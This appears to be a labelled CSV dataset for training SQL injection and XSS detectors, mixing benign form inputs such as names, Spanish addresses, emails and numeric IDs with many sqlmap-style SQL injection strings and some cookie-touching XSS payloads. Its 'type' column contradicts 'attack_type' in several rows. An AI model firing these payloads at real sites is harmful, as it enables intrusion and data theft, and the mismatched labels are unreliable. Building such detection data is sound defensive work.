Text,attack_type,Label,type
kinsey@etnics.fm,norm,0,normal
saciedad,norm,0,normal
1' in boolean mode) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')#,sqli,1,sql
"-9370') where 7070=7070 or make_set(9354=9354,7185)--",sqli,1,sql
17864,norm,0,normal
"calle brasil 185, 11f",norm,0,normal
31560,norm,0,normal
"1'+(select 'qrml' where 3791=3791 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,1,sql
"<script>referenceerror.prototype.__definegetter__('name', function(){alert(1)}),x</script>",xss,2,xss
"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'ukxj'='ukxj",sqli,1,sql
cheuk7,norm,0,normal
08611,norm,0,normal
"1%"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""%""=""",sqli,1,sql
"1%"") union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
degeistirk@meneamex.pr,norm,0,normal
"<img id=xss style=""xss:expr/*xss*/ession(alert('xss'))"">",xss,2,sql
"c/ bellavista, 70 10h",norm,0,normal
1%')));begin dbms_lock.sleep(5); end--,sqli,1,sql
mortandad,norm,0,normal
chumpipe,norm,0,normal
"1%""));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((""%""=""",sqli,1,sql
"c/ coronel cervio nuez, 35 3-c",norm,0,normal
-5967 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)# lhoh,sqli,1,sql
3655911674701564,norm,0,normal
65931091g,norm,0,normal
33693,norm,0,normal
8651552740405089,norm,0,normal
"1"") as dezr where 2145=2145 or sleep(5)#",sqli,1,normal
"1%"")));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
1);(select * from (select(sleep(5)))acdk)#,sqli,1,sql
"1') as irsh where 4973=4973 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
bevis,norm,0,normal
1) or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
4u4yad5,norm,0,normal
"1') and elt(1210=1210,sleep(5)) and ('gtov' like 'gtov",sqli,1,normal
"1%'));iif(5257=5257,1,1/0)",sqli,1,sql
0852672704954562,norm,0,normal
e00u4rda2,norm,0,normal
gutierrez@sutelefono.cx,norm,0,normal
5705,norm,0,normal
"1%"") and sleep(5)#",sqli,1,normal
coralie,norm,0,normal
1%');if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
"1')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('uadr' like 'uadr",sqli,1,sql
des9o89451rac28,norm,0,normal
tauro 34 7b,norm,0,normal
37793,norm,0,normal
"1"") as nfpe where 2679=2679;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
"1' in boolean mode) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""urqg""=""urqg",sqli,1,normal
"1%"")) union all select null,null,null,null,null#",sqli,1,sql
flore,norm,0,normal
cnudde.mccauley@waikilu.so,norm,0,normal
-6865) or (8459=8459)*4906 and (6107=6107,sqli,1,normal
"pl. campo de criptana, 47,",norm,0,normal
ajenador,norm,0,normal
"1"" union all select null--",sqli,1,sql
"1%""))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
duan,norm,0,normal
"1""))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""tepf""=""tepf",sqli,1,sql
dariela,norm,0,normal
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",sqli,1,sql
07500,norm,0,normal
scheurer ezpeleta,norm,0,normal
hawker-wiese7@tradora.mg,norm,0,normal
2417733801163656,norm,0,normal
"1%""))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
stockbridge@softstylestudio.mk,norm,0,normal
"-9725') union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",sqli,1,sql
"1;select * from generate_series(3341,3341,case when (3341=3072) then 1 else 0 end) limit 1--",sqli,1,sql
5885536306326029,norm,0,normal
0293148493278191,norm,0,normal
sabu@aridossanchez.lt,norm,0,normal
rego,norm,0,normal
"1%' and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
band@casadedurcal.bi,norm,0,normal
"-8347%') union all select 7643,7643,7643--",sqli,1,sql
bjelic@tradedeficit.dd,norm,0,normal
"ronda bellesguard 125, 11?c",norm,0,normal
1')) as xqvq where 4816=4816 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
"1%"") and 9764=6037 and (""%""=""",sqli,1,normal
1'+(select ukwc where 3008=3008 or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
08447437c,norm,0,normal
"-4739')) union all select 6585,6585,6585,6585,6585--",sqli,1,sql
cu2tre8a,norm,0,normal
6246,norm,0,normal
30736152x,norm,0,normal
"//--></script>"">'><script>alert(string.fromcharcode(88,83,83))</script>",xss,2,xss
bekki,norm,0,normal
29,norm,0,normal
1%' or 6793=(select 6793 from pg_sleep(5)) and '%'=',sqli,1,sql
+fisgn,norm,0,normal
benedit ferrandi,norm,0,normal
m601c1te,norm,0,normal
"1"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""oyfk""=""oyfk",sqli,1,sql
"1"") as jiiq where 6847=6847;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
cotner,norm,0,normal
p44m8scu6916n,norm,0,normal
pl. san juan harria 141,norm,0,normal
18011,norm,0,normal
9o52cardea7,norm,0,normal
aguistin,norm,0,normal
castellanos de moriscos,norm,0,normal
es2o135mie5to,norm,0,normal
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'),sqli,1,sql
syrett,norm,0,normal
"1 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
32830,norm,0,normal
-4892%')) or 2251=9881--,sqli,1,sql
prec3+s,norm,0,normal
"1') or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
-2756' where 6156=6156 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
"1"") as semi where 4260=4260;select count(*) from generate_series(1,5000000)--",sqli,1,sql
1')) rlike (select (case when (8489=8820) then 1 else 0x28 end)) and (('fbjf'='fbjf,sqli,1,sql
"1') where 5616=5616;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""ikaf"" like ""ikaf",sqli,1,normal
evandro,norm,0,normal
1%'))) or sleep(5)#,sqli,1,normal
nelba,norm,0,normal
1%');begin dbms_lock.sleep(5); end and ('%'=',sqli,1,sql
indicioso,norm,0,normal
00930465t,norm,0,normal
1') where 6842=6842;begin dbms_lock.sleep(5); end--,sqli,1,sql
bettiana,norm,0,normal
"1%""));(select * from (select(sleep(5)))acdk)#",sqli,1,sql
03339,norm,0,normal
4at4pln,norm,0,normal
64079837c,norm,0,normal
llort pato,norm,0,normal
surrell puppato,norm,0,normal
1') where 2330=2330 and (select * from (select(sleep(5)))fzno)--,sqli,1,sql
c/ borja 137 8?c,norm,0,normal
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('hpbt'='hpbt",sqli,1,sql
2146778309020113,norm,0,normal
"1) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,normal
castejn de henares,norm,0,normal
paseo arco del ladrillo 48 10?h,norm,0,normal
"c/ guzman de alfarache, 113 1?a",norm,0,normal
"residencial maframal 15,",norm,0,normal
5518,norm,0,normal
"-3767') as eefl where 8260=8260 union all select 8260,8260,8260,8260,8260,8260,8260#",sqli,1,sql
"1"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""gjtx"" like ""gjtx",sqli,1,sql
"-2298%' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"1"" where 7796=7796;select case when 7717=7717 then 1 else null end--",sqli,1,sql
salerno.harmer@nexuspark.li,norm,0,normal
87179467z,norm,0,normal
stroupe,norm,0,normal
"1"") union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"-4233%"") or (8459=8459)*4906 and (""%""=""",sqli,1,normal
1534175885053234,norm,0,normal
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1,sql
1' in boolean mode);select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
"1' where 7613=7613;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
las gijn,norm,0,normal
1') where 8776=8776 and 6969=(select 6969 from pg_sleep(5))--,sqli,1,sql
janisch4@ebaz.museum,norm,0,normal
65358703v,norm,0,normal
"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
asensio kuschel,norm,0,normal
riento@maison-cadaques.gd,norm,0,normal
engendrar,norm,0,normal
1 where 2239=2239 and 6969=(select 6969 from pg_sleep(5))--,sqli,1,sql
1'+(select lptb where 3861=3861 or sleep(5))+',sqli,1,sql
9173,norm,0,normal
1')) rlike (select (case when (3876=2077) then 1 else 0x28 end)) and (('hqcz' like 'hqcz,sqli,1,sql
calle la salina 7 1?b,norm,0,normal
abagail,norm,0,normal
peabody,norm,0,normal
"carrer mestre albages 61,",norm,0,normal
cabaas del castillo,norm,0,normal
sappington-espana@fighting-machines.mq,norm,0,normal
1'+(select 'mjgo' where 4026=4026;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
77r6gami4545,norm,0,normal
nicole-meyer@creacionesdolcevita.us,norm,0,normal
betts@beltoan.com.my,norm,0,normal
"-5396'||(select 'fjhd' from dual where 4019=4019 union all select 4019,4019,4019,4019#",sqli,1,sql
t!74ador,norm,0,normal
<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>,xss,2,sql
"c/ empecinado 134, 3-b",norm,0,normal
[a][a]script>alert('xss');[a][a]/script>,xss,2,sql
1621765359998786,norm,0,normal
ittaly,norm,0,normal
"1'||(select 'zbdv' where 1618=1618 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))||'",sqli,1,sql
"-2216"") where 6692=6692 union all select 6692,6692,6692#",sqli,1,sql
"-7731"")) or make_set(2551=4389,4389) and ((""unly"" like ""unly",sqli,1,normal
santa marta de tormes,norm,0,normal
faisana,norm,0,normal
goldwyn,norm,0,normal
apretn,norm,0,normal
shuster,norm,0,normal
9473535060757439,norm,0,normal
"'';!--""<crosssitescripting>=&{()}",xss,2,sql
fragmentar,norm,0,normal
1073,norm,0,normal
1%') and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
bartholo,norm,0,normal
crdoba,norm,0,normal
9116424268966228,norm,0,normal
herminda,norm,0,normal
alobras,norm,0,normal
"1%"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((""%""=""",sqli,1,sql
solano,norm,0,normal
42836631m,norm,0,normal
"1)) as llnm where 6510=6510 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1'||(select 'iwlj' where 8704=8704 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))||'",sqli,1,sql
"1%')) union all select null,null,null,null,null,null,null,null--",sqli,1,sql
schreier,norm,0,normal
r1pie0go,norm,0,normal
1'||(select 'uedk' where 4655=4655;waitfor delay '0:0:5')||',sqli,1,sql
albegar,norm,0,normal
fulvia,norm,0,normal
4248,norm,0,normal
"-4397'))) or make_set(9354=9354,7185) and ((('omqt'='omqt",sqli,1,normal
aida 184,norm,0,normal
90127318r,norm,0,normal
hinojosa zuba,norm,0,normal
47728723c,norm,0,normal
1) as dlkh where 6179=6179 and 9198=9198--,sqli,1,sql
"1"") where 8571=8571 and elt(4249=4249,7259)--",sqli,1,sql
1' where 6359=6359 and (3020=3020)*6703--,sqli,1,sql
villacastn,norm,0,normal
"joaquin nogueras 51,",norm,0,normal
5716,norm,0,normal
"1"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,normal
1'))) or 6793=(select 6793 from pg_sleep(5)) and ((('odsl' like 'odsl,sqli,1,sql
palmara@ajedrezconmaestros.museum,norm,0,normal
1%')) rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
1))) and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
04762189q,norm,0,normal
"1' in boolean mode) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)#",sqli,1,sql
"-3953) as wjjk where 6433=6433 or make_set(9354=9354,7185)--",sqli,1,sql
aeriel,norm,0,normal
1063,norm,0,normal
jabalquinto,norm,0,normal
"1"") as ivuv where 5691=5691;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
917a327n9?do,norm,0,normal
cervera de la caada,norm,0,normal
1951,norm,0,normal
"-1<a href=""javascript#document.cookie=true;"">",xss,2,sql
70243797a,norm,0,normal
"1"") as vdim where 1296=1296;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
61126872w,norm,0,normal
"glorieta pastrana, 17 1-b",norm,0,normal
"avda. manuel gorria, 97, 7?f",norm,0,normal
"c/ elvas 112, 13-a",norm,0,normal
1%')));if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
"1')) as yyud where 4934=4934;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
sati,norm,0,normal
25727,norm,0,normal
46114,norm,0,normal
canals beramendi,norm,0,normal
"-8797"")) order by 1#",sqli,1,normal
"valencia, 79 12?h",norm,0,normal
"-6370')) as sims where 9388=9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",sqli,1,sql
"1%') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('%'='",sqli,1,normal
"-9240' union all select 6538,6538,6538#",sqli,1,sql
del nuevo mundo s/n,norm,0,normal
"1"" or 6793=(select 6793 from pg_sleep(5)) and ""pwwb"" like ""pwwb",sqli,1,sql
jorba bastardes,norm,0,normal
"-3347'+(select xuzs where 1076=1076 union all select 1076,1076,1076,1076,1076--",sqli,1,sql
secretario espino 67 4?g,norm,0,normal
gassol,norm,0,normal
orbegoso,norm,0,normal
-6095') or 6872=6872 and ('bfwm' like 'bfwm,sqli,1,normal
"1%'))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
suany,norm,0,normal
96304534s,norm,0,normal
5719,norm,0,normal
"curuxa, s/n 10-f",norm,0,normal
luyten,norm,0,normal
6i97s9r02t1,norm,0,normal
1%');begin user_lock.sleep(5); end and ('%'=',sqli,1,sql
82332840q,norm,0,normal
"-8550"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""kyad""=""kyad",sqli,1,sql
5mpe92onal,norm,0,normal
combee,norm,0,normal
nuo gmez,norm,0,normal
46084,norm,0,normal
cuatriduana,norm,0,normal
"luis braille, 193 6?a",norm,0,normal
"1%')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('%'='",sqli,1,sql
"1"") where 9020=9020 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,sql
01226,norm,0,normal
wilton7@weat.ic,norm,0,normal
estiradamente,norm,0,normal
"virgen del mayor dolor 188, 11?a",norm,0,normal
geldof@fok.ye,norm,0,normal
*paci3nte,norm,0,normal
oliveira_aptekman@engibraltar.va,norm,0,normal
maciel,norm,0,normal
"c/ pintor viver s/n, 1?b",norm,0,normal
estalell,norm,0,normal
zonc4o,norm,0,normal
"-9699"")) or (8459=8459)*4906 and ((""dufs""=""dufs",sqli,1,normal
52984297w,norm,0,normal
"-7868' in boolean mode) union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",sqli,1,sql
drapinska@mataluenga.pg,norm,0,normal
tresjuncos,norm,0,normal
filogamo@copiar.com.nu,norm,0,normal
"calle roncesvalls 8,",norm,0,normal
48,norm,0,normal
masooda,norm,0,normal
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'omlt'='omlt,sqli,1,sql
balulde,norm,0,normal
br9621.0,norm,0,normal
76914964c,norm,0,normal
olrich-shapiro1@nuriamartin.aw,norm,0,normal
26295439e,norm,0,normal
alcalde manuel de la pinta s/n 13?f,norm,0,normal
pifiar,norm,0,normal
12190,norm,0,normal
silvina,norm,0,normal
santa mara de las hoyas,norm,0,normal
kindra,norm,0,normal
"1"") where 5719=5719 rlike sleep(5)--",sqli,1,sql
"1 where 1886=1886 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
heli,norm,0,normal
22997112x,norm,0,normal
berleand@campanasextractoras.la,norm,0,normal
duo_davalos@designworld.cz,norm,0,normal
"1%""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""%""=""",sqli,1,sql
"1"");select count(*) from generate_series(1,5000000) and (""jzmg""=""jzmg",sqli,1,sql
vallejera de riofro,norm,0,normal
4233835783562631,norm,0,normal
94731203e,norm,0,normal
1'||(select 'mlwj' from dual where 4247=4247 and 1702=8469)||',sqli,1,sql
"1'+(select sxco where 1623=1623 union all select null,null--",sqli,1,sql
panosh,norm,0,normal
"1'||(select 'adni' from dual where 6611=6611;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)||'",sqli,1,sql
"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",sqli,1,sql
4eat1n,norm,0,normal
domenge canelas,norm,0,normal
v70t4oso,norm,0,normal
83247140c,norm,0,normal
"1%') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('%'='",sqli,1,sql
1'));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
"travesia san pablo 57, 7?e",norm,0,normal
40190,norm,0,normal
fontanarejo,norm,0,normal
"1%"") union all select null,null,null,null,null,null,null,null--",sqli,1,sql
casaubn de rosa,norm,0,normal
symington@portaldesign.md,norm,0,normal
"1"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""fcpm""=""fcpm",sqli,1,sql
47330,norm,0,normal
2796348455963884,norm,0,normal
"1%"") union all select null#",sqli,1,sql
ronaldso,norm,0,normal
"1"") where 7588=7588 waitfor delay '0:0:5'--",sqli,1,sql
zamora,norm,0,normal
1'+(select cxvy where 7421=7421;begin user_lock.sleep(5); end)+',sqli,1,sql
"concejo de alzuza, 47,",norm,0,normal
forcarei,norm,0,normal
esclarecidamente,norm,0,normal
-6453%')) or (8459=8459)*4906 and (('%'=',sqli,1,normal
712,norm,0,normal
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('gtcb'='gtcb",sqli,1,sql
"c/ echegaray s/n,",norm,0,normal
"1'+(select ohqr where 5610=5610;select like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,1,sql
abla,norm,0,normal
69539711q,norm,0,normal
golpejas,norm,0,normal
anael,norm,0,normal
"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('asdc' like 'asdc",sqli,1,sql
madan deluca,norm,0,normal
reason@cajucar.br,norm,0,normal
valverde de valdelacasa,norm,0,normal
"calle finlandia, 46, 6-a",norm,0,normal
"1) where 8671=8671 and make_set(4931=1642,1642)--",sqli,1,sql
nava,norm,0,normal
24710,norm,0,normal
esther,norm,0,normal
sau,norm,0,normal
"-1439"" or 2849=8484 and ""pmdl""=""pmdl",sqli,1,normal
1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('vnfi'='vnfi,sqli,1,sql
"1""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""jzsb""=""jzsb",sqli,1,sql
"calle salou, 26, 12g",norm,0,normal
yvone,norm,0,normal
buchel-alymer@gemas.org.bu,norm,0,normal
"1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
4220,norm,0,normal
1') where 7537=7537 and 2006=2006,sqli,1,normal
46726,norm,0,normal
"1')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('novq'='novq",sqli,1,normal
colom colldevall,norm,0,normal
1') as gsjr where 7046=7046 and sleep(5)#,sqli,1,normal
1%')) union all select null#,sqli,1,sql
"calle rio arlanza, 161",norm,0,normal
"1') where 1212=1212;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1) where 9552=9552 and 1961=6333--,sqli,1,sql
augur,norm,0,normal
"1)) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
horcajo de montemayor,norm,0,normal
"-2054%""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",sqli,1,sql
kristel,norm,0,normal
rufino,norm,0,normal
9091453994786923,norm,0,normal
medianero,norm,0,normal
12796200n,norm,0,normal
"1%"") waitfor delay '0:0:5' and (""%""=""",sqli,1,normal
"1') where 4407=4407 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1 where 7362=7362 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
marice,norm,0,normal
"1%"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""%""=""",sqli,1,normal
arvid,norm,0,normal
9140660684303193,norm,0,normal
dumeniaud@lamejorplaya.tn,norm,0,normal
"1"" or 8466=benchmark(5000000,md5(0x694a4745))",sqli,1,normal
3227728964471059,norm,0,normal
zalzale1,norm,0,normal
-2431') or 8571=8571--,sqli,1,sql
"1'||(select 'hrpa' where 1973=1973 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
d4s,norm,0,normal
almacenamiento,norm,0,normal
"1)) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
1' in boolean mode) or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
"elt(5953=5953,1)",sqli,1,normal
zarrapastrosamente,norm,0,normal
"c/ alqueria de rubiols, s/n, 11?d",norm,0,normal
1632,norm,0,normal
jochim@ajuntamentdebarcelona2-0.qa,norm,0,normal
calle juan de dios montaes s/n,norm,0,normal
educativo,norm,0,normal
siefert,norm,0,normal
"1"" where 3933=3933 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,1,sql
agraviamiento,norm,0,normal
"1"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""wjhj""=""wjhj",sqli,1,sql
9170,norm,0,normal
"1%"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""%""=""",sqli,1,normal
abdushilov@mundoapple.kn,norm,0,normal
joan de joanes 61 3?h,norm,0,normal
"-8043%""))) or make_set(9354=9354,7185) and (((""%""=""",sqli,1,normal
pbkim,norm,0,normal
"chopo, 10",norm,0,normal
katia,norm,0,normal
"1%"";waitfor delay '0:0:5'--",sqli,1,sql
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ""cbck"" like ""cbck",sqli,1,sql
"1"") and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""ypoj""=""ypoj",sqli,1,sql
"1%')) union all select null,null#",sqli,1,sql
landesman@cohel.mw,norm,0,normal
-9014' order by 1--,sqli,1,sql
"masia can giro, 5",norm,0,normal
"1%"" or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
arnaldo,norm,0,normal
"<!--<value><![cdata[<xml id=i><x><c><![cdata[<img id=xss src=""javas<![cdata[cript:alert('xss');"">",xss,2,sql
"-9959"") where 7073=7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",sqli,1,sql
33,norm,0,normal
1' in boolean mode) and 4457=3885#,sqli,1,normal
"caridad 82,",norm,0,normal
those,norm,0,normal
rayadillo,norm,0,normal
"-2704"") union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",sqli,1,sql
"1)) as jfae where 6684=6684 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
chimillas,norm,0,normal
swope,norm,0,normal
"plaa adria 152,",norm,0,normal
82839528z,norm,0,normal
radioelctrica,norm,0,normal
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
